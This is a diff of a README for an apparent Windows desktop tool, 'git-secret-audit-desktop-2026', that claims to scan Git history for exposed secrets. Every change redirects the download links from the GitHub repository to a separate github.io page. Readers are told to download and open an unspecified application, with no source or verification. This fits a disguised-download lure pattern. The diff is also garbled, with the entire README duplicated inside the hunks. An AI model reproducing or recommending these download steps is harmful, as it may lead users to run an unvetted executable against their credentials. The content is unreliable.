@@ -1,14 +1,14 @@
 # 🔒 git-secret-audit-desktop-2026 - Find Exposed Secrets Before Anyone Else
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-FF5A5F?style=for-the-badge&logo=github&logoColor=white)](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026)
+[![Download Now](https://img.shields.io/badge/Download%20Now-FF5A5F?style=for-the-badge&logo=github&logoColor=white)](https://noemiirenebarrante.github.io)
 
-Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026)
+Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://noemiirenebarrante.github.io)
 
 git-secret-audit-desktop-2026 is a desktop utility for scanning Git repositories for exposed secrets, tokens, and credentials in full commit history. It helps you check a project folder before you share it, publish it, or hand it to someone else. This guide is written for Windows users who want to download and run the application without programming knowledge.
 
 ## 🚀 Getting Started
 
-1. Visit this link to download the application: [https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026).
+1. Visit this link to download the application: [https://noemiirenebarrante.github.io](https://noemiirenebarrante.github.io).
 2. Wait for the download to finish.
 3. Open the downloaded application from your Downloads folder.
 4. Use the application window to choose the repository folder you want to check.
@@ -18,7 +18,7 @@ The application is designed as a desktop utility. You do not need to write comma
 
 ## 📥 Download and Setup
 
-Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026)
+Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://noemiirenebarrante.github.io)
 
 After the download finishes, open the application from your Downloads folder. Use the application window to select the Git repository you want to scan. The utility checks the repository files and its full commit history for exposed secrets, tokens, and credentials. When the scan finishes, review the findings and decide which items need attention.
 
@@ -55,20 +55,20 @@ Regular secret scanning is useful before publishing a repository, before sharing
 
 ## 🪟 Windows Quick Start
 
-1. Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026).
+1. Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://noemiirenebarrante.github.io).
 2. Wait for the download to complete.
 3. Open the downloaded application from your Downloads folder.
 # 🔒 git-secret-audit-desktop-2026 - Find Exposed Secrets Before Anyone Else
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-FF5A5F?style=for-the-badge&logo=github&logoColor=white)](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026)
+[![Download Now](https://img.shields.io/badge/Download%20Now-FF5A5F?style=for-the-badge&logo=github&logoColor=white)](https://noemiirenebarrante.github.io)
 
-Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026)
+Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://noemiirenebarrante.github.io)
 
 git-secret-audit-desktop-2026 is a desktop utility for scanning Git repositories for exposed secrets, tokens, and credentials in full commit history. It helps you check a project folder before you share it, publish it, or hand it to someone else. This guide is written for Windows users who want to download and run the application without programming knowledge.
 
 ## 🚀 Getting Started
 
-1. Visit this link to download the application: [https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026).
+1. Visit this link to download the application: [https://noemiirenebarrante.github.io](https://noemiirenebarrante.github.io).
 2. Wait for the download to finish.
 3. Open the downloaded application from your Downloads folder.
 4. Use the application window to choose the repository folder you want to check.
@@ -78,7 +78,7 @@ The application is designed as a desktop utility. You do not need to write comma
 
 ## 📥 Download and Setup
 
-Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026)
+Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://noemiirenebarrante.github.io)
 
 After the download finishes, open the application from your Downloads folder. Use the application window to select the Git repository you want to scan. The utility checks the repository files and its full commit history for exposed secrets, tokens, and credentials. When the scan finishes, review the findings and decide which items need attention.
 
@@ -115,7 +115,7 @@ Regular secret scanning is useful before publishing a repository, before sharing
 
 ## 🪟 Windows Quick Start
 
-1. Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026).
+1. Visit this link to download the application: [Download git-secret-audit-desktop-2026](https://noemiirenebarrante.github.io).
 2. Wait for the download to complete.
 3. Open the downloaded application from your Downloads folder.
 4. Choose the Git repository folder you want to scan.
